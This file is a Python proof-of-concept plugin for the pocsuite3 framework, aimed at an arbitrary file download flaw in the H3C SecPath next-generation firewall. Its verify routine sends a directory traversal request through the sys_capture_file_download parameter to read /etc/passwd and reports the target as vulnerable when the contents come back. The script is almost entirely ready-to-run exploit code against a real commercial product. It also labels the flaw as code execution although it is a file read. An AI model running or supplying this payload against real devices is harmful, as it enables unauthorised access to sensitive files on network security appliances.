from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
class DemoPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = 'H3C SecPath 任意文件读取'
    appName = 'H3C'
    appVersion = '3.0.1'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''H3C SecPath 下一代防火墙 存在功能点导致任意文件下载漏洞，攻击者通过漏洞可以获取敏感信息'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        try:
            target = self.url+"/webui/?g=sys_capture_file_download&name=../../../../../../../../etc/passwd"
            r = requests.get(url=target,timeout=5,verify=False)
            if r.status_code == 200 and "root" in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
                result['VerifyInfo']['payload'] = "/webui/?g=sys_capture_file_download&name=../../../../../../../../etc/passwd"
                return self.parse_output(result)
        except:
            return
    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)